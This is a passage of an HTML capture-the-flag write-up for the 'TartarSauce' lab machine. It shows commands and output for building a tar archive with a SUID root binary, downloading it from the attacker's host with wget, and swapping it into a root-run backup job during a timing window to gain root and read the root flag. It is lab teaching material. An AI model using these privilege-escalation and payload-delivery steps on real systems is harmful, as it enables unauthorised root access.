+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;rootme&nbsp;var/www/html/</span>
+            </div>
+        </div><br>
+        <br>
+        Make the SUID binary executable by everyone, and give it a SUID bit.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#chmod&nbsp;777&nbsp;var/www/html/rootme</span><br>
+                ─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#chmod&nbsp;u+s&nbsp;var/www/html/rootme</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ls&nbsp;-l&nbsp;var/www/html/rootme</span><br>
+                -rwsrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;15532&nbsp;Oct&nbsp;27&nbsp;02<span style="color:#ff9d00;font-weight:700">:</span>20&nbsp;var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span>rootme
+            </div>
+        </div><br>
+        <br>
+        Finally, compress the archive and serve it to your attacking system with python -m SimpleHTTPServer<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#tar&nbsp;czf&nbsp;rootme.tar.gz&nbsp;var</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#tar&nbsp;-tf&nbsp;rootme.tar.gz&nbsp;</span><br>
+                var<span style="color:#ff9d00;font-weight:700">/</span><br>
+                var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span><br>
+                var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span><br>
+                var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span>rootme<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer</span>
+            </div>
+        </div><br>
+        <br>
+        Download the malicious gzip archive to your attacking system.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>backups$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>rootme.tar.gz<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;36K<br>
+                drwxrwxrwt&nbsp;&nbsp;8&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;28&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>51&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;14&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;onuma&nbsp;onuma&nbsp;2.7K&nbsp;Oct&nbsp;26&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>30&nbsp;rootme.tar.gz<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>6b) Race against the clock</strong></h3><br>
+        Check when <code>/usr/sbin/backuperer</code> is next run by checking the system timers.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">export</span>&nbsp;<span style="color:#7f0044;font-weight:400">TERM</span>=xterm-256color<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;systemctl&nbsp;list-timers<br>
+                NEXT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LEFT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LAST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PASSED&nbsp;&nbsp;&nbsp;<br>
+                Mon&nbsp;2019-10-28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>38<span style="color:#ff9d00;font-weight:700">:</span>53&nbsp;EDT&nbsp;&nbsp;1min&nbsp;56s&nbsp;left&nbsp;Mon&nbsp;2019-10-28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>33<span style="color:#ff9d00;font-weight:700">:</span>53&nbsp;EDT&nbsp;&nbsp;3min&nbsp;3s<br>
+                [...]<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">(</span>q&nbsp;+&nbsp;enter&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">exit)</span>
+            </div>
+        </div><br>
+        <br>
+        <code>/usr/bin/backuperer</code> is next run at <code>09:38:53</code>.<br>
+        Check the system with <code>date</code>.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">date</span><br>
+                Mon&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>38<span style="color:#ff9d00;font-weight:700">:</span>53&nbsp;EDT&nbsp;2019
+            </div>
+        </div><br>
+        <br>
+        When it's time, there should be a <code>.&lt;sha1 hash&gt;</code> file in <code>/var/tmp</code>.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;7.2M<br>
+                drwxrwxrwt&nbsp;&nbsp;8&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;14&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;onuma&nbsp;onuma&nbsp;7.2M&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;.4ec13c593cf179d6cfcbd7e79af22708ef75537c<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;onuma&nbsp;onuma&nbsp;2.7K&nbsp;Oct&nbsp;26&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>30&nbsp;rootme.tar.gz<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        You now have 30 seconds to delete the <code>.&lt;sha1 hash&gt;</code> file and rename/copy your malicious archive to that of the <code>.&lt;sha1 hash&gt;</code> file.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">rm</span>&nbsp;.4ec13c593cf179d6cfcbd7e79af22708ef75537c<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;rootme.tar.gz&nbsp;.4ec13c593cf179d6cfcbd7e79af22708ef75537c&nbsp;<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;40K<br>
+                drwxrwxrwt&nbsp;&nbsp;8&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;14&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;onuma&nbsp;onuma&nbsp;2.7K&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;.4ec13c593cf179d6cfcbd7e79af22708ef75537c<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;onuma&nbsp;onuma&nbsp;2.7K&nbsp;Oct&nbsp;26&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>30&nbsp;rootme.tar.gz<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        After 30 seconds, the <code>.&lt;sha1 hash&gt;</code> file should be extracted into a <code>/check</code> directory.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;44K<br>
+                drwxrwxrwt&nbsp;&nbsp;9&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;14&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;onuma&nbsp;onuma&nbsp;2.7K&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;.4ec13c593cf179d6cfcbd7e79af22708ef75537c<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;3&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;28&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;check<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;onuma&nbsp;onuma&nbsp;2.7K&nbsp;Oct&nbsp;26&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>30&nbsp;rootme.tar.gz<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Inside <code>/check</code> should be your SUID binary.<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;check<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<br>
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>check<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                [...]<br>
+                -rwsrwxrwx&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;16K&nbsp;Oct&nbsp;26&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>20&nbsp;rootme
+            </div>
+        </div><br>
+        <br>
+        Execute it, and you'll be root!<br>
+            <div class="codebox">
+                onuma@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>check<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>rootme<br>
+                root@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>check<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html#&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>,24<span style="color:#ff9d00;font-weight:700">(</span>cdrom<span style="color:#ff9d00;font-weight:700">)</span>,30<span style="color:#ff9d00;font-weight:700">(</span>dip<span style="color:#ff9d00;font-weight:700">)</span>,46<span style="color:#ff9d00;font-weight:700">(</span>plugdev<span style="color:#ff9d00;font-weight:700">)</span>,1000<span style="color:#ff9d00;font-weight:700">(</span>onuma<span style="color:#ff9d00;font-weight:700">)</span><br>
+                root@TartarSauce<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>check<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>root.txt<br>
+                e79abdab8...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
